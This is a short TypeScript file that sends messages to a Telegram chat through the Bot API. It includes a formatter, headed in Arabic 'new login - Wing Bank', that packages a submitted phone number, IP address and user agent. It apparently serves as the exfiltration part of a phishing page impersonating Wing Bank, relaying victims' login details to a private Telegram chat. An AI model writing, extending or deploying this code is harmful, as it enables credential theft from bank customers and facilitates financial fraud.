/**
 * Telegram notification helper
 * Sends messages to a Telegram chat using the Bot API
 */

interface TelegramConfig {
  botToken: string;
  chatId: string;
}

let telegramConfig: TelegramConfig | null = null;

/**
 * Initialize Telegram configuration
 */
export function initTelegram(botToken: string, chatId: string) {
  telegramConfig = { botToken, chatId };
}

/**
 * Send a message to Telegram
 */
export async function sendTelegramMessage(message: string): Promise<boolean> {
  if (!telegramConfig) {
    console.warn("[Telegram] Not configured. Please set TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID");
    return false;
  }

  try {
    const url = `https://api.telegram.org/bot${telegramConfig.botToken}/sendMessage`;
    
    const response = await fetch(url, {
      method: "POST",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({
        chat_id: telegramConfig.chatId,
        text: message,
        parse_mode: "HTML",
      }),
    });

    const data = await response.json();

    if (!response.ok || !data.ok) {
      console.error("[Telegram] Failed to send message:", data);
      return false;
    }

    console.log("[Telegram] Message sent successfully");
    return true;
  } catch (error) {
    console.error("[Telegram] Error sending message:", error);
    return false;
  }
}

/**
 * Format phone submission for Telegram
 */
export function formatPhoneSubmissionMessage(
  phoneNumber: string,
  ipAddress?: string,
  userAgent?: string
): string {
  const timestamp = new Date().toLocaleString("en-US", {
    timeZone: "Asia/Phnom_Penh",
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    second: "2-digit",
  });

  let message = `🔔 <b>تسجيل دخول جديد - Wing Bank</b>\n\n`;
  message += `📱 <b>رقم الهاتف:</b> ${phoneNumber}\n`;
  message += `⏰ <b>الوقت:</b> ${timestamp}\n`;
  
  if (ipAddress) {
    message += `🌐 <b>عنوان IP:</b> ${ipAddress}\n`;
  }
  
  if (userAgent) {
    message += `💻 <b>المتصفح:</b> ${userAgent.substring(0, 100)}${userAgent.length > 100 ? "..." : ""}\n`;
  }

  return message;
}

